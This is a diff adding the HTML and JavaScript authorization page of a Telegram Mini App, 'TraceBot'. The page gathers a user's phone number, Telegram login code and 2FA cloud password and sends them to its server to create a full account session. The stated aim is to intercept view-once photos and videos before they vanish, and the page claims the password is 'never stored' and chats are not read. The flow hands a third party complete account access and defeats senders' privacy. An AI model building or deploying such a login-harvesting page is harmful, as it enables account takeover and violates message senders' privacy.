@@ -1,0 +1,705 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>TraceBot — Authorization</title>
+<script src="https://telegram.org/js/telegram-web-app.js"></script>
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Sans:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0a0f;
+    --surface: #12121a;
+    --surface2: #1a1a26;
+    --border: rgba(255,255,255,0.06);
+    --accent: #6c63ff;
+    --accent2: #a78bfa;
+    --success: #34d399;
+    --error: #f87171;
+    --text: #e8e8f0;
+    --muted: rgba(232,232,240,0.45);
+    --radius: 16px;
+  }
+
+  * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
+
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'DM Sans', sans-serif;
+    font-weight: 400;
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    padding: 24px 20px;
+    overflow-x: hidden;
+  }
+
+  /* Ambient glow */
+  body::before {
+    content: '';
+    position: fixed;
+    top: -30%;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 600px;
+    height: 400px;
+    background: radial-gradient(ellipse, rgba(108,99,255,0.12) 0%, transparent 70%);
+    pointer-events: none;
+    z-index: 0;
+  }
+
+  .wrap {
+    width: 100%;
+    max-width: 400px;
+    position: relative;
+    z-index: 1;
+  }
+
+  /* Header */
+  .logo {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 36px;
+  }
+  .logo-icon {
+    width: 44px; height: 44px;
+    background: linear-gradient(135deg, var(--accent), var(--accent2));
+    border-radius: 12px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 22px;
+    box-shadow: 0 8px 24px rgba(108,99,255,0.3);
+  }
+  .logo-text {
+    font-family: 'Syne', sans-serif;
+    font-weight: 800;
+    font-size: 22px;
+    letter-spacing: -0.5px;
+  }
+  .logo-text span { color: var(--accent2); }
+
+  /* Info card */
+  .info-card {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: var(--radius);
+    padding: 20px;
+    margin-bottom: 28px;
+  }
+  .info-card h3 {
+    font-family: 'Syne', sans-serif;
+    font-weight: 700;
+    font-size: 15px;
+    margin-bottom: 14px;
+    color: var(--text);
+  }
+  .feature-row {
+    display: flex;
+    align-items: flex-start;
+    gap: 12px;
+    padding: 10px 0;
+    border-bottom: 1px solid var(--border);
+  }
+  .feature-row:last-child { border-bottom: none; padding-bottom: 0; }
+  .feature-row:first-of-type { padding-top: 0; }
+  .feat-icon {
+    width: 32px; height: 32px; flex-shrink: 0;
+    background: var(--surface2);
+    border-radius: 8px;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 15px;
+  }
+  .feat-text { flex: 1; }
+  .feat-text strong {
+    display: block;
+    font-size: 13px;
+    font-weight: 500;
+    margin-bottom: 2px;
+    color: var(--text);
+  }
+  .feat-text span {
+    font-size: 12px;
+    color: var(--muted);
+    line-height: 1.4;
+  }
+
+  /* Privacy note */
+  .privacy {
+    display: flex;
+    gap: 10px;
+    align-items: flex-start;
+    background: rgba(108,99,255,0.08);
+    border: 1px solid rgba(108,99,255,0.2);
+    border-radius: 12px;
+    padding: 14px;
+    margin-bottom: 28px;
+    font-size: 12px;
+    color: var(--muted);
+    line-height: 1.5;
+  }
+  .privacy-icon { font-size: 16px; flex-shrink: 0; margin-top: 1px; }
+
+  /* Form */
+  .form-group { margin-bottom: 16px; }
+  .form-label {
+    display: block;
+    font-size: 12px;
+    font-weight: 500;
+    color: var(--muted);
+    margin-bottom: 8px;
+    letter-spacing: 0.5px;
+    text-transform: uppercase;
+  }
+  .form-input {
+    width: 100%;
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 14px 16px;
+    font-family: 'DM Sans', sans-serif;
+    font-size: 16px;
+    color: var(--text);
+    outline: none;
+    transition: border-color 0.2s, box-shadow 0.2s;
+    -webkit-appearance: none;
+  }
+  .form-input::placeholder { color: var(--muted); }
+  .form-input:focus {
+    border-color: var(--accent);
+    box-shadow: 0 0 0 3px rgba(108,99,255,0.15);
+  }
+  .form-input.error { border-color: var(--error); }
+  .form-hint {
+    font-size: 11px;
+    color: var(--muted);
+    margin-top: 6px;
+  }
+
+  /* Buttons */
+  .btn {
+    width: 100%;
+    padding: 15px;
+    border-radius: 12px;
+    font-family: 'Syne', sans-serif;
+    font-weight: 700;
+    font-size: 15px;
+    letter-spacing: 0.3px;
+    cursor: pointer;
+    border: none;
+    outline: none;
+    transition: opacity 0.2s, transform 0.1s;
+    position: relative;
+    overflow: hidden;
+  }
+  .btn:active { transform: scale(0.98); }
+  .btn-primary {
+    background: linear-gradient(135deg, var(--accent), var(--accent2));
+    color: #fff;
+    box-shadow: 0 8px 24px rgba(108,99,255,0.35);
+  }
+  .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+  .btn-secondary {
+    background: var(--surface2);
+    color: var(--muted);
+    margin-top: 10px;
+  }
+
+  /* Steps */
+  .step { display: none; }
+  .step.active { display: block; animation: fadeIn 0.3s ease; }
+
+  @keyframes fadeIn {
+    from { opacity: 0; transform: translateY(8px); }
+    to { opacity: 1; transform: translateY(0); }
+  }
+
+  /* Error / success msg */
+  .msg {
+    padding: 12px 14px;
+    border-radius: 10px;
+    font-size: 13px;
+    margin-bottom: 16px;
+    line-height: 1.4;
+    display: none;
+  }
+  .msg.show { display: block; }
+  .msg.error { background: rgba(248,113,113,0.1); border: 1px solid rgba(248,113,113,0.25); color: var(--error); }
+  .msg.success { background: rgba(52,211,153,0.1); border: 1px solid rgba(52,211,153,0.25); color: var(--success); }
+
+  /* Loader */
+  .loader {
+    display: inline-block;
+    width: 18px; height: 18px;
+    border: 2px solid rgba(255,255,255,0.3);
+    border-top-color: #fff;
+    border-radius: 50%;
+    animation: spin 0.7s linear infinite;
+    vertical-align: middle;
+    margin-right: 8px;
+  }
+  @keyframes spin { to { transform: rotate(360deg); } }
+
+  /* Success state */
+  .success-wrap {
+    text-align: center;
+    padding: 20px 0;
+  }
+  .success-circle {
+    width: 72px; height: 72px;
+    background: linear-gradient(135deg, var(--success), #059669);
+    border-radius: 50%;
+    display: flex; align-items: center; justify-content: center;
+    font-size: 32px;
+    margin: 0 auto 20px;
+    box-shadow: 0 12px 32px rgba(52,211,153,0.3);
+    animation: popIn 0.4s cubic-bezier(0.34,1.56,0.64,1);
+  }
+  @keyframes popIn {
+    from { transform: scale(0); opacity: 0; }
+    to { transform: scale(1); opacity: 1; }
+  }
+  .success-title {
+    font-family: 'Syne', sans-serif;
+    font-weight: 800;
+    font-size: 22px;
+    margin-bottom: 10px;
+  }
+  .success-sub { color: var(--muted); font-size: 14px; line-height: 1.5; }
+
+  /* Lang switcher */
+  .lang-bar {
+    display: flex;
+    gap: 6px;
+    margin-bottom: 28px;
+    flex-wrap: wrap;
+  }
+  .lang-btn {
+    padding: 6px 12px;
+    border-radius: 8px;
+    font-size: 12px;
+    font-weight: 500;
+    cursor: pointer;
+    border: 1px solid var(--border);
+    background: var(--surface);
+    color: var(--muted);
+    transition: all 0.15s;
+  }
+  .lang-btn.active {
+    background: var(--accent);
+    border-color: var(--accent);
+    color: #fff;
+  }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+  <!-- Logo -->
+  <div class="logo">
+    <div class="logo-icon">🫆</div>
+    <div class="logo-text">Trace<span>Bot</span></div>
+  </div>
+
+  <!-- Language switcher -->
+  <div class="lang-bar" id="langBar">
+    <button class="lang-btn active" onclick="setLang('en')">🇬🇧 EN</button>
+    <button class="lang-btn" onclick="setLang('ru')">🇷🇺 RU</button>
+    <button class="lang-btn" onclick="setLang('pt')">🇧🇷 PT</button>
+    <button class="lang-btn" onclick="setLang('id')">🇮🇩 ID</button>
+  </div>
+
+  <!-- Step 1: Explain + Phone -->
+  <div class="step active" id="step1">
+
+    <div class="info-card">
+      <h3 id="txt-why-title">Why is this needed?</h3>
+      <div class="feature-row">
+        <div class="feat-icon">📸</div>
+        <div class="feat-text">
+          <strong id="txt-f1-title">Disappearing photos & videos</strong>
+          <span id="txt-f1-desc">Telegram doesn't share one-time media with bots by default. Linking your account allows TraceBot to intercept them before they vanish.</span>
+        </div>
+      </div>
+      <div class="feature-row">
+        <div class="feat-icon">🔒</div>
+        <div class="feat-text">
+          <strong id="txt-f2-title">Your session, your control</strong>
+          <span id="txt-f2-desc">The session is stored only on our server and is used exclusively to detect one-time media. We do not read your chats.</span>
+        </div>
+      </div>
+      <div class="feature-row">
+        <div class="feat-icon">⚡️</div>
+        <div class="feat-text">
+          <strong id="txt-f3-title">Works in the background</strong>
+          <span id="txt-f3-desc">Once linked, interception runs automatically. You can disconnect at any time from the bot.</span>
+        </div>
+      </div>
+    </div>
+
+    <div class="privacy">
+      <span class="privacy-icon">🛡</span>
+      <span id="txt-privacy">We only intercept incoming one-time media in private chats. Your messages are never stored, read, or shared with third parties.</span>
+    </div>
+
+    <div class="msg" id="msg1"></div>
+
+    <div class="form-group">
+      <label class="form-label" id="lbl-phone">Phone number</label>
+      <input
+        class="form-input"
+        id="phoneInput"
+        type="tel"
+        placeholder="+1 234 567 8900"
+        autocomplete="tel"
+      >
+      <div class="form-hint" id="hint-phone">Include country code. You will receive a Telegram code.</div>
+    </div>
+
+    <button class="btn btn-primary" id="btnSendCode" onclick="sendCode()">
+      <span id="btnSendCodeText">Send code →</span>
+    </button>
+  </div>
+
+  <!-- Step 2: Code -->
+  <div class="step" id="step2">
+    <div class="msg" id="msg2"></div>
+
+    <div class="form-group">
+      <label class="form-label" id="lbl-code">Verification code</label>
+      <input
+        class="form-input"
+        id="codeInput"
+        type="text"
+        inputmode="numeric"
+        placeholder="12345"
+        maxlength="10"
+        autocomplete="one-time-code"
+      >
+      <div class="form-hint" id="hint-code">Enter the code from the Telegram app (not SMS).</div>
+    </div>
+
+    <button class="btn btn-primary" id="btnVerify" onclick="verifyCode()">
+      <span id="btnVerifyText">Verify →</span>
+    </button>
+    <button class="btn btn-secondary" id="btnBack" onclick="goBack()">← Back</button>
+  </div>
+
+  <!-- Step 3: 2FA -->
+  <div class="step" id="step3">
+    <div class="msg" id="msg3"></div>
+
+    <div class="form-group">
+      <label class="form-label" id="lbl-2fa">Cloud password (2FA)</label>
+      <input
+        class="form-input"
+        id="pwdInput"
+        type="password"
+        placeholder="••••••••"
+        autocomplete="current-password"
+      >
+      <div class="form-hint" id="hint-2fa">Your Telegram cloud password. It is never stored.</div>
+    </div>
+
+    <button class="btn btn-primary" id="btnPwd" onclick="submitPassword()">
+      <span id="btnPwdText">Confirm →</span>
+    </button>
+  </div>
+
+  <!-- Step 4: Success -->
+  <div class="step" id="step4">
+    <div class="success-wrap">
+      <div class="success-circle">✓</div>
+      <div class="success-title" id="txt-success-title">All set!</div>
+      <div class="success-sub" id="txt-success-sub">
+        Interception is now active. One-time photos and videos will be forwarded to you as files.<br><br>
+        You can disconnect at any time from the bot menu.
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<script>
+  // ── Telegram WebApp init ──────────────────────────────────────────
+  const tg = window.Telegram?.WebApp;
+  if (tg) {
+    tg.ready();
+    tg.expand();
+  }
+
+  // ── Get user_id from URL or Telegram ──────────────────────────────
+  const urlParams = new URLSearchParams(window.location.search);
+  const userId = tg?.initDataUnsafe?.user?.id || urlParams.get('user_id');
+  const API_BASE = window.location.origin;
+
+  // ── i18n ──────────────────────────────────────────────────────────
+  let currentLang = 'en';
+
+  // Auto-detect from Telegram
+  const tgLang = tg?.initDataUnsafe?.user?.language_code?.slice(0, 2);
+  if (['ru','en','pt','id'].includes(tgLang)) currentLang = tgLang;
+
+  const TR = {
+    en: {
+      'why-title': 'Why is this needed?',
+      'f1-title': 'Disappearing photos & videos',
+      'f1-desc': "Telegram doesn't share one-time media with bots by default. Linking your account allows TraceBot to intercept them before they vanish.",
+      'f2-title': 'Your session, your control',
+      'f2-desc': 'The session is stored only on our server and is used exclusively to detect one-time media. We do not read your chats.',
+      'f3-title': 'Works in the background',
+      'f3-desc': 'Once linked, interception runs automatically. You can disconnect at any time from the bot.',
+      'privacy': 'We only intercept incoming one-time media in private chats. Your messages are never stored, read, or shared with third parties.',
+      'lbl-phone': 'Phone number',
+      'hint-phone': 'Include country code. You will receive a Telegram code.',
+      'btnSend': 'Send code →',
+      'lbl-code': 'Verification code',
+      'hint-code': 'Enter the code from the Telegram app (not SMS).',
+      'btnVerify': 'Verify →',
+      'lbl-2fa': 'Cloud password (2FA)',
+      'hint-2fa': 'Your Telegram cloud password. It is never stored.',
+      'btnPwd': 'Confirm →',
+      'btnBack': '← Back',
+      'success-title': 'All set!',
+      'success-sub': 'Interception is now active. One-time photos and videos will be forwarded to you as files.\n\nYou can disconnect at any time from the bot menu.',
+    },
+    ru: {
+      'why-title': 'Зачем это нужно?',
+      'f1-title': 'Исчезающие фото и видео',
+      'f1-desc': 'Telegram не передаёт одноразовые медиа ботам по умолчанию. Привязка аккаунта позволяет TraceBot перехватывать их до исчезновения.',
+      'f2-title': 'Твоя сессия — твой контроль',
+      'f2-desc': 'Сессия хранится только на нашем сервере и используется исключительно для обнаружения одноразовых медиа. Мы не читаем твою переписку.',
+      'f3-title': 'Работает в фоне',
+      'f3-desc': 'После привязки перехват работает автоматически. Отключить можно в любой момент прямо в боте.',
+      'privacy': 'Мы перехватываем только входящие одноразовые медиа в личных чатах. Твои сообщения никогда не сохраняются и не передаются третьим лицам.',
+      'lbl-phone': 'Номер телефона',
+      'hint-phone': 'Включая код страны. На него придёт код в Telegram.',
+      'btnSend': 'Отправить код →',
+      'lbl-code': 'Код подтверждения',
+      'hint-code': 'Введи код из приложения Telegram (не SMS).',
+      'btnVerify': 'Подтвердить →',
+      'lbl-2fa': 'Облачный пароль (2FA)',
+      'hint-2fa': 'Пароль облачного шифрования Telegram. Нигде не сохраняется.',
+      'btnPwd': 'Подтвердить →',
+      'btnBack': '← Назад',
+      'success-title': 'Готово!',
+      'success-sub': 'Перехват активен. Одноразовые фото и видео будут приходить тебе как файлы.\n\nОтключить можно в меню бота.',
+    },
+    pt: {
+      'why-title': 'Para que serve isso?',
+      'f1-title': 'Fotos e vídeos temporários',
+      'f1-desc': 'O Telegram não compartilha mídia de uso único com bots por padrão. Vincular sua conta permite que o TraceBot as intercepte antes que desapareçam.',
+      'f2-title': 'Sua sessão, seu controle',
+      'f2-desc': 'A sessão é armazenada apenas em nosso servidor e usada exclusivamente para detectar mídia de uso único. Não lemos seus chats.',
+      'f3-title': 'Funciona em segundo plano',
+      'f3-desc': 'Uma vez vinculado, a interceptação funciona automaticamente. Você pode desconectar a qualquer momento pelo bot.',
+      'privacy': 'Interceptamos apenas mídias de uso único recebidas em chats privados. Suas mensagens nunca são armazenadas ou compartilhadas.',
+      'lbl-phone': 'Número de telefone',
+      'hint-phone': 'Inclua o código do país. Você receberá um código do Telegram.',
+      'btnSend': 'Enviar código →',
+      'lbl-code': 'Código de verificação',
+      'hint-code': 'Digite o código do aplicativo Telegram (não SMS).',
+      'btnVerify': 'Verificar →',
+      'lbl-2fa': 'Senha na nuvem (2FA)',
+      'hint-2fa': 'Sua senha de criptografia em nuvem do Telegram. Nunca é armazenada.',
+      'btnPwd': 'Confirmar →',
+      'btnBack': '← Voltar',
+      'success-title': 'Pronto!',
+      'success-sub': 'A interceptação está ativa. Fotos e vídeos temporários serão encaminhados a você como arquivos.\n\nVocê pode desconectar a qualquer momento pelo menu do bot.',
+    },
+    id: {
+      'why-title': 'Untuk apa ini?',
+      'f1-title': 'Foto & video sementara',
+      'f1-desc': 'Telegram tidak membagikan media sekali-pakai ke bot secara default. Menautkan akun Anda memungkinkan TraceBot mencegatnya sebelum hilang.',
+      'f2-title': 'Sesi Anda, kontrol Anda',
+      'f2-desc': 'Sesi hanya disimpan di server kami dan digunakan khusus untuk mendeteksi media sekali-pakai. Kami tidak membaca obrolan Anda.',
+      'f3-title': 'Bekerja di latar belakang',
+      'f3-desc': 'Setelah ditautkan, intersepsi berjalan otomatis. Anda dapat memutuskan kapan saja dari bot.',
+      'privacy': 'Kami hanya mencegat media sekali-pakai yang masuk di obrolan pribadi. Pesan Anda tidak pernah disimpan atau dibagikan.',
+      'lbl-phone': 'Nomor telepon',
+      'hint-phone': 'Sertakan kode negara. Anda akan menerima kode Telegram.',
+      'btnSend': 'Kirim kode →',
+      'lbl-code': 'Kode verifikasi',
+      'hint-code': 'Masukkan kode dari aplikasi Telegram (bukan SMS).',
+      'btnVerify': 'Verifikasi →',
+      'lbl-2fa': 'Kata sandi cloud (2FA)',
+      'hint-2fa': 'Kata sandi enkripsi cloud Telegram Anda. Tidak pernah disimpan.',
+      'btnPwd': 'Konfirmasi →',
+      'btnBack': '← Kembali',
+      'success-title': 'Selesai!',
+      'success-sub': 'Intersepsi sekarang aktif. Foto dan video sekali-pakai akan diteruskan kepada Anda sebagai file.\n\nAnda dapat memutuskan kapan saja dari menu bot.',
+    },
+  };
+
+  function setLang(lang) {
+    currentLang = lang;
+    const tr = TR[lang] || TR.en;
+    // Update all text nodes
+    const map = {
+      'txt-why-title': 'why-title',
+      'txt-f1-title': 'f1-title', 'txt-f1-desc': 'f1-desc',
+      'txt-f2-title': 'f2-title', 'txt-f2-desc': 'f2-desc',
+      'txt-f3-title': 'f3-title', 'txt-f3-desc': 'f3-desc',
+      'txt-privacy': 'privacy',
+      'lbl-phone': 'lbl-phone', 'hint-phone': 'hint-phone',
+      'lbl-code': 'lbl-code', 'hint-code': 'hint-code',
+      'lbl-2fa': 'lbl-2fa', 'hint-2fa': 'hint-2fa',
+      'txt-success-title': 'success-title', 'txt-success-sub': 'success-sub',
+      'btnBack': 'btnBack',
+    };
+    for (const [id, key] of Object.entries(map)) {
+      const el = document.getElementById(id);
+      if (el) el.textContent = tr[key] || el.textContent;
+    }
+    document.getElementById('btnSendCodeText').textContent = tr['btnSend'];
+    document.getElementById('btnVerifyText').textContent = tr['btnVerify'];
+    document.getElementById('btnPwdText').textContent = tr['btnPwd'];
+    // Active lang button
+    document.querySelectorAll('.lang-btn').forEach(b => {
+      b.classList.toggle('active', b.textContent.toLowerCase().includes(lang));
+    });
+  }
+
+  // Apply detected lang on load
+  setLang(currentLang);
+
+  // ── State ─────────────────────────────────────────────────────────
+  let phoneValue = '';
+
+  function showStep(n) {
+    document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
+    document.getElementById(`step${n}`).classList.add('active');
+  }
+
+  function showMsg(stepN, text, type) {
+    const el = document.getElementById(`msg${stepN}`);
+    el.textContent = text;
+    el.className = `msg ${type} show`;
+  }
+  function hideMsg(stepN) {
+    const el = document.getElementById(`msg${stepN}`);
+    if (el) el.className = 'msg';
+  }
+
+  function setLoading(btnId, textId, loading, originalText) {
+    const btn = document.getElementById(btnId);
+    const span = document.getElementById(textId);
+    if (loading) {
+      btn.disabled = true;
+      span.innerHTML = `<span class="loader"></span>`;
+    } else {
+      btn.disabled = false;
+      span.textContent = originalText;
+    }
+  }
+
+  // ── API calls ─────────────────────────────────────────────────────
+  async function sendCode() {
+    hideMsg(1);
+    phoneValue = document.getElementById('phoneInput').value.trim();
+    if (!phoneValue.startsWith('+') || phoneValue.length < 8) {
+      document.getElementById('phoneInput').classList.add('error');
+      showMsg(1, 'Please enter a valid phone number with country code (+...)', 'error');
+      return;
+    }
+    document.getElementById('phoneInput').classList.remove('error');
+
+    const tr = TR[currentLang] || TR.en;
+    setLoading('btnSendCode', 'btnSendCodeText', true, tr['btnSend']);
+
+    try {
+      const res = await fetch(`${API_BASE}/api/auth/send_code`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          user_id: userId,
+          phone: phoneValue,
+          init_data: tg?.initData || '',
+        }),
+      });
+      const data = await res.json();
+      if (data.ok) {
+        showStep(2);
+      } else {
+        showMsg(1, data.error || 'Error sending code', 'error');
+      }
+    } catch (e) {
+      showMsg(1, 'Network error. Please try again.', 'error');
+    }
+    setLoading('btnSendCode', 'btnSendCodeText', false, tr['btnSend']);
+  }
+
+  async function verifyCode() {
+    hideMsg(2);
+    const code = document.getElementById('codeInput').value.trim().replace(/\s/g, '');
+    if (!code || code.length < 4) {
+      showMsg(2, 'Please enter the verification code', 'error');
+      return;
+    }
+    const tr = TR[currentLang] || TR.en;
+    setLoading('btnVerify', 'btnVerifyText', true, tr['btnVerify']);
+
+    try {
+      const res = await fetch(`${API_BASE}/api/auth/sign_in`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          user_id: userId,
+          code: code,
+          init_data: tg?.initData || '',
+        }),
+      });
+      const data = await res.json();
+      if (data.ok) {
+        showStep(4);
+        setTimeout(() => tg?.close(), 3000);
+      } else if (data.need_password) {
+        showStep(3);
+      } else {
+        showMsg(2, data.error || 'Invalid code', 'error');
+      }
+    } catch (e) {
+      showMsg(2, 'Network error. Please try again.', 'error');
+    }
+    setLoading('btnVerify', 'btnVerifyText', false, tr['btnVerify']);
+  }
+
+  async function submitPassword() {
+    hideMsg(3);
+    const pwd = document.getElementById('pwdInput').value;
+    if (!pwd) {
+      showMsg(3, 'Please enter your password', 'error');
+      return;
+    }
+    const tr = TR[currentLang] || TR.en;
+    setLoading('btnPwd', 'btnPwdText', true, tr['btnPwd']);
+
+    try {
+      const res = await fetch(`${API_BASE}/api/auth/2fa`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          user_id: userId,
+          password: pwd,
+          init_data: tg?.initData || '',
+        }),
+      });
+      const data = await res.json();
+      if (data.ok) {
+        showStep(4);
+        setTimeout(() => tg?.close(), 3000);
+      } else {
+        showMsg(3, data.error || 'Wrong password', 'error');
+      }
+    } catch (e) {
+      showMsg(3, 'Network error. Please try again.', 'error');
+    }
+    setLoading('btnPwd', 'btnPwdText', false, tr['btnPwd']);
+  }
+
+  function goBack() { showStep(1); }
+</script>
+</body>
+</html>
